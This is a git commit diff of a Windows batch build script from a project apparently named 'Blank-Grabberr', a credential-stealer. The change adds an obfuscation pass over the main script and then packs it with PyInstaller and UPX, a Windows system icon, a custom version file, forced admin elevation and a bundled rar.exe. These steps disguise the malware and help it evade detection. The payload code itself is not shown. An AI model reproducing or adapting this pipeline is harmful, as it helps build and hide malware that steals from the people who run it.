5aceb8cb93a8b952860ec0c6e96a8fd9640ba2b9
43a1723 <hai1723notgay@gmail.com>
2024-06-17 20:06:26 +0700

    Update buildmy.bat

--- build/buildmy.bat
+++ build/buildmy.bat
@@ -1,2 +1,3 @@
 @echo off
-pyinstaller --noconfirm --onefile --windowed --icon "D:/v/Blank-Grabberr/build/imageres_15.ico" --upx-dir "D:/v/Blank-Grabberr/UPX" --version-file "D:/v/Blank-Grabberr/Blank Grabber/Components/version.txt" --uac-admin --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rar.exe;." --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rarreg.key;."  "D:/v/Blank-Grabberr/argcode.py"
+python "D:\v\Blank-Grabberr\build\BlankOBFv2.py" -i "D:\v\Blank-Grabberr\argcode.py" -o "D:\v\Blank-Grabberr\argcode-o.py"
+pyinstaller --noconfirm --onefile --windowed --icon "D:/v/Blank-Grabberr/build/imageres_15.ico" --upx-dir "D:/v/Blank-Grabberr/UPX" --version-file "D:/v/Blank-Grabberr/Blank Grabber/Components/version.txt" --uac-admin --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rar.exe;." --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rarreg.key;."  "D:/v/Blank-Grabberr/argcode-o.py"
